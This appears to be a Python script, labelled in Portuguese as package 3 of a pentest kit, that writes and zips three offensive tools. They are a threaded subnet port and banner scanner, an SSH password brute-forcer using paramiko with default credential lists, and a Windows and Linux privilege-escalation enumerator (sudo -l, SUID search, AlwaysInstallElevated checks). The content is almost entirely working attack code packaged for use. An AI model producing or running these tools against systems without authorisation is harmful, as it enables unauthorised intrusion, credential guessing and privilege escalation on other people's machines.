# Criando o Pacote 3: Pivoting + Pós-Exploração
import os
from zipfile import ZipFile

# Diretórios
os.makedirs("/mnt/data/pentest_kit/lateral_movement", exist_ok=True)
os.makedirs("/mnt/data/pentest_kit/post_exploitation", exist_ok=True)

# Scripts

network_scanner = '''
import socket
import threading

common_ports = {
    21: "FTP", 22: "SSH", 23: "Telnet", 80: "HTTP", 139: "SMB", 445: "SMB",
    3306: "MySQL", 3389: "RDP"
}

def scan_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((ip, port))
        if result == 0:
            try:
                banner = sock.recv(1024).decode().strip()
            except:
                banner = "No banner"
            service = common_ports.get(port, "Unknown")
            print(f"[+] Open port {port} ({service}) - Banner: {banner}")
        sock.close()
    except:
        pass

def scan_host(ip):
    print(f"[*] Scanning host {ip}...")
    for port in range(20, 1024):
        threading.Thread(target=scan_port, args=(ip, port)).start()

if __name__ == "__main__":
    target_subnet = "192.168.1." # Trocar para sua subnet
    for i in range(1, 255):
        target_ip = f"{target_subnet}{i}"
        threading.Thread(target=scan_host, args=(target_ip,)).start()
'''

ssh_bruteforce_pivot = '''
import paramiko
import sys

def ssh_bruteforce(host, userlist, passlist):
    for username in userlist:
        for password in passlist:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=username.strip(), password=password.strip(), timeout=3)
                print(f"[+] Success! Username: {username} Password: {password}")
                client.close()
                return (username, password)
            except:
                pass
    print("[-] Bruteforce failed.")
    return None

if __name__ == "__main__":
    host = "192.168.1.100"  # Trocar para IP alvo
    users = ["root", "admin", "user"]
    passwords = ["123456", "password", "admin123"]
    creds = ssh_bruteforce(host, users, passwords)
'''

privilege_escalation_enum = '''
import os
import platform
import subprocess

def check_windows_privesc():
    print("[*] Checking Windows Privilege Escalation...")
    print("[*] Current User:")
    os.system("whoami /priv")
    print("[*] Checking for alwaysInstallElevated policy:")
    os.system("reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer")
    os.system("reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer")
    print("[*] Checking for service misconfigurations:")
    os.system("sc query")

def check_linux_privesc():
    print("[*] Checking Linux Privilege Escalation...")
    print("[*] Current User:")
    os.system("id")
    print("[*] Checking sudo permissions:")
    os.system("sudo -l")
    print("[*] Finding SUID files:")
    os.system("find / -perm -4000 -type f 2>/dev/null")

if __name__ == "__main__":
    system = platform.system()
    if system == "Windows":
        check_windows_privesc()
    elif system == "Linux":
        check_linux_privesc()
    else:
        print("Unsupported OS")
'''

# Escrever os scripts
with open("/mnt/data/pentest_kit/lateral_movement/network_scanner.py", "w") as f:
    f.write(network_scanner)

with open("/mnt/data/pentest_kit/lateral_movement/ssh_bruteforce_pivot.py", "w") as f:
    f.write(ssh_bruteforce_pivot)

with open("/mnt/data/pentest_kit/post_exploitation/privilege_escalation_enum.py", "w") as f:
    f.write(privilege_escalation_enum)

# Compactar o Pacote 3
with ZipFile('/mnt/data/pentest_kit_pivoting_postexploit.zip', 'w') as zipf:
    for root, dirs, files in os.walk('/mnt/data/pentest_kit'):
        for file in files:
            zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), '/mnt/data/pentest_kit'))

"/mnt/data/pentest_kit_pivoting_postexploit.zip"

